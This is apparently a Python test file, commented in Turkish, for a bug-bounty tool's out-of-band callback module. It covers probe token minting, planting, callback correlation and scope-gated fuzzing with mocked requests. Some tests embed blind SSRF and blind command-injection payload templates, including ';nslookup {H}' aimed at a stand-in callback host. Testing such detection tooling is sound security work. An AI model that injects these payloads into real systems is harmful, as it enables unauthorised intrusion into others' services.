"""OOB / OAST — token mint, prob ekimi, callback korelasyonu (saf mantık + mock istek)."""

import requests

import bugtool.oob as oob_mod
from bugtool.oob import OobManager, mint_token, read_hit_tokens
from bugtool.fuzzer import ParamFuzzer


def test_mint_token_deterministic():
    assert mint_token("seed", 1) == mint_token("seed", 1)     # aynı girdi → aynı token
    assert mint_token("seed", 1) != mint_token("seed", 2)     # farklı seq → farklı
    assert mint_token("a", 1) != mint_token("b", 1)           # farklı seed → farklı
    t = mint_token("seed", 1)
    assert t.isalnum() and t.islower() and len(t) == 16       # DNS-label güvenli


def test_plant_records_and_embeds():
    m = OobManager("oast.example", seed="s1")
    token, payload = m.plant("blind_ssrf", "http://a.example.com/p?u=1", "u", "http://{H}/")
    assert token in m.probes
    assert f"{token}.oast.example" in payload
    assert m.probes[token]["class"] == "blind_ssrf"
    assert m.probes[token]["param"] == "u"


def test_correlate_matches_hits():
    m = OobManager("oast.example", seed="s1")
    t1, _ = m.plant("blind_ssrf", "http://a.example.com/?u=1", "u", "http://{H}/")
    t2, _ = m.plant("blind_cmdi", "http://a.example.com/?c=1", "c", ";nslookup {H}")
    # collaborator'dan t1 için tam DNS adı, t2 hiç gelmedi
    confirmed = m.correlate([f"{t1}.oast.example.", "unrelated.token.xyz"])
    assert len(confirmed) == 1
    assert confirmed[0]["class"] == "blind_ssrf"
    assert confirmed[0]["status"] == "confirmed_oob"
    assert confirmed[0]["verdict"] == "fired"


def test_correlate_no_false_match():
    m = OobManager("oast.example", seed="s1")
    m.plant("blind_ssrf", "http://a.example.com/?u=1", "u", "http://{H}/")
    assert m.correlate(["completely.different.host"]) == []


def test_save_load_roundtrip(tmp_path):
    m = OobManager("oast.example", seed="s1")
    t1, _ = m.plant("blind_ssrf", "http://a.example.com/?u=1", "u", "http://{H}/")
    path = str(tmp_path / "oob_probes.json")
    m.save(path)
    loaded = OobManager.load(path)
    assert loaded is not None
    assert t1 in loaded.probes
    assert loaded.correlate([t1])[0]["class"] == "blind_ssrf"


def test_read_hit_tokens(tmp_path):
    p = tmp_path / "hits.txt"
    p.write_text("token1.oast.example\n\n  token2  \n", encoding="utf-8")
    assert read_hit_tokens(str(p)) == ["token1.oast.example", "token2"]


def test_load_missing_returns_none(tmp_path):
    assert OobManager.load(str(tmp_path / "yok.json")) is None


def test_fuzzer_plant_oob(monkeypatch):
    monkeypatch.setattr(requests.sessions.Session, "get",
                        lambda self, url, **kw: type("R", (), {"text": "", "status_code": 200,
                                                               "headers": {}})())
    fz = ParamFuzzer()
    m = OobManager("oast.example", seed="s1")
    targets = [{"url": "http://a.example.com/p?u=1", "params": {"u": ["ssrf"]}}]
    planted = fz.plant_oob(targets, m)
    assert planted > 0
    assert len(m.probes) == planted           # her ekilen prob kaydedildi


def test_fuzzer_plant_oob_scope_gated(monkeypatch):
    monkeypatch.setattr(requests.sessions.Session, "get",
                        lambda self, url, **kw: type("R", (), {"text": "", "status_code": 200,
                                                               "headers": {}})())
    fz = ParamFuzzer(scope_checker=lambda host: host.endswith("inscope.com"))
    m = OobManager("oast.example", seed="s1")
    targets = [{"url": "http://evil.com/p?u=1", "params": {"u": ["ssrf"]}}]
    assert fz.plant_oob(targets, m) == 0       # kapsam-dışı → hiç prob gömülmedi
    assert fz._sent == 0
